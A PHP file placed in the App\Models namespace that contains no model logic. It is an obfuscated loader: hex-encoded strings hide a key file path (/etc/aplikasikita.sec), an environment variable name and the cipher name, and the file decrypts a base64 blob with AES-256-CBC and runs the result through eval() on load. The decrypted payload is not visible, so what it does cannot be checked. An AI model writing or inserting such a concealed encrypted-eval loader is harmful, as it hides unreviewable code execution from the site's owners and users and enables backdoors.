<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wNFl+dAglrZHzSK3Q1bGDw==');

$c=base64_decode(

'ZNvBvDAUH8veNqBpve74fumix6d447qsm2v9sHSLPBxF8xjvFeqHxD7vQP/l3R0dFEbN+bRHWSkz' .
'Vl7Hd4mWG+h9v2Qladl6lTX7ds/esaJOBe69h0SCQRfWroznntAbuYrKBUFu7C4IClUaUAHQjYwn' .
'44lzUap4Fcf7fSfJROefxT5xmsO9nOjtzLsUNyNEP4M8Tbo3JBoTcUTzciUd6HrwIx/UPuuqIPpK' .
'Nj51cxhM4ArO9A6f7Ey665NEMf2fo7L4uTl505LWZAcLvk4GNDqThpGzbI2xQrLiX6KI/nZ3qRX7' .
'afzoO0bNXt36wxHPgYjhY7FEJ95YZyvfIHdEVDQWEGLeDui6LQU1IMrgQAEXGCxDmUyyuwYm7AZm' .
'2d5GXivG47ZhU0XSRk5LuQ45kBkrWxAYHAuoYCZkAnTyUczDPbWtHP87ktis3l3G502xMKvmRd89' .
'PWy/YlBGp2Aaah7QFChtINF+qLvN49ogNoSVdEGUT7SPJ1GstfMThzs6JPWHc3ma7bKb/I2EjBy4' .
'BK6e519mw7K5g/OFrBPrKd+OBlSxEDWxP3Ok+3AjrO34jEQgIiWUYhbBbI0DcxC0UyuhcjFQN8G4' .
'VuDPcAzArsaFit22pKQpEoh9MoTelzTPVBrtCfUe4FcwzIpPs7g/0CIPsbZLWu11+PmfAQ3dEtoV' .
'nRbxVsXi+7bpIomE7dKIdLbQeNmsuaCqRMWpH6YRW+Y9Ae5Iuh4pxMRGdLY6hefji6GoixFFHfBv' .
'jqLcYFdB8Qy17d44HAL6dKiDzApK0pt96uZZKlc9n49U7M1p2C/IvHoXch4Y8AvCt8RdZXCcJlVs' .
'Co7pf3gN/wdPGDQqAP5LAFnIPBFz+UFw5WwQ/uL+z8TxPYc/w46Z3UPXsO9K/l/DVlHuHRWvCdbM' .
'A6qHXmf5zj3spPTK0oinQdJ0gAG/wOjPUDdAAkH8HcIUtUuyqECRz7pSYTjMQTpPrPKqL8Uo5PRs' .
'Gg98ctzpquSk+9XNboS/sPqZEPzcqL3dc4P8BKAXFbbO3bPPmZetmTgGTv6es4VNzcRQ0St64edu' .
'JcO+JIS/NSh3VZuAJyo4X1m/h8OVEhLBM5TK897hszGy7Kf4FJSP+lqvmEc3TRKg92Z+Hh4vKEwi' .
'uD/ytTuqD8GMxEYw/gY4nTBS9JcUs3J+QdFzXN6sDJP7EGlmY5PhY7q/Lez2Dlsg/Peb7MtWNLer'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

